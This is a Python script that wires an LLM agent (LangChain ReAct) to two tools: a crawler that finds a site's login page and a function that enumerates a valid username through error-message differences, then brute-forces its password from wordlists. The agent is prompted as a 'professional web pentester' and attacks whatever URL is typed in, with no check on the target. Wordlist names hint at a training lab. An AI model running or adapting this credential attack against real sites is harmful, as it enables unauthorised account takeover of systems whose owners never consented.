import os
import readline
import requests
from bs4 import BeautifulSoup
from langchain import hub
from langchain.agents import AgentExecutor, create_react_agent
from langchain.tools import tool
from langchain_community.document_loaders.recursive_url_loader import RecursiveUrlLoader

from langsmith import Client
os.environ["LANGCHAIN_TRACING_V2"] = "true"
os.environ["LANGCHAIN_PROJECT"] = f"LangSmith Auth Bruteforce"
os.environ["LANGCHAIN_ENDPOINT"] = "https://api.smith.langchain.com"
client = Client()

from langchain_google_genai import ChatGoogleGenerativeAI
llm = ChatGoogleGenerativeAI(model=os.getenv("GOOGLE_MODEL"))
#from langchain_openai import ChatOpenAI
#llm = ChatOpenAI(model=os.getenv("OPENAI_MODEL"))
#from langchain_anthropic import ChatAnthropic
#llm = ChatAnthropic(model=os.getenv("ANTHROPIC_MODEL"))

def login_url(url):
    url = url.lower()
    return "login" in url

def check_redirects(url):
    """
    Checks each URL in a list for redirects and returns if it contains login
    """
    try:
        # Send a request to the URL with allow_redirects set to True
        response = requests.get(url, allow_redirects=True)
        # Check if any redirection has occurred
        if response.history:
            # If redirected, check the url 
            if login_url(response.url):
                return response.url
    except requests.RequestException as e:
        # Handle exceptions and add them to the result with an error message
        return None
    return None

@tool("find_login_page", return_direct=False)
def find_login_page(base_url):
    """The function will try to find the login page url"""
    loader = RecursiveUrlLoader(
        url = base_url,
        max_depth = 2,
    )

    docs = loader.load()

    login_page = None

    for doc in docs:
        login_page = doc.metadata["source"]
        if login_url(login_page):
            break 
        
        redirect_url = check_redirects(login_page)
        if redirect_url:
            login_page = redirect_url
            break
    
    return login_page


@tool("get_creds", return_direct=False)
def get_creds(login_url):
    """Given the login page url the function will find the credentials needed to login"""
    
    s = requests.Session()
    lines = open("./data/auth-lab-usernames","r").readlines()
    for user in lines:
        target = user.strip()
        logindata = {
            'username' : target,
            'password' : 'foo'
        }
        resp = s.post(login_url, data=logindata)
        soup = BeautifulSoup(resp.text,'html.parser')
        if 'username' not in soup.find('p', {'class':'is-warning'}).text:
            print(f'username is {target}')
            break

    lines = open("./data/auth-lab-passwords","r").readlines()
    for pwd in lines:
        passwd = pwd.strip()
        print(f'tool output: \n')
        print(f'trying {target} and {passwd}')
        logindata = {
            'username' : target,
            'password' : passwd
        }
        resp = s.post(login_url, data=logindata)
        soup = BeautifulSoup(resp.text,'html.parser')
        if not soup.find('p', {'class':'is-warning'}):
            return f"You successfully found the username and password. Username: {target} Password: {passwd}"
            break


tools = [get_creds, find_login_page]

base_prompt = hub.pull("langchain-ai/react-agent-template")
prompt = base_prompt.partial(instructions="You are a professional web pentester.  Attempt to login to the site given. ")

agent = create_react_agent(llm,tools,prompt)

agent_executor = AgentExecutor(agent=agent, tools=tools, verbose=True)

print("Welcome to my brute-force login application.  I am configured with these tools:")
for tool in agent_executor.tools:
  print(f'  Tool: {tool.name} = {tool.description}')
print("Give me the URL for a site and I will try to login to it.")

line = input("llm>> ")
try:
    if line:
        result = agent_executor.invoke({"input":line})
        print(result)
except Exception as e:
    print(e)


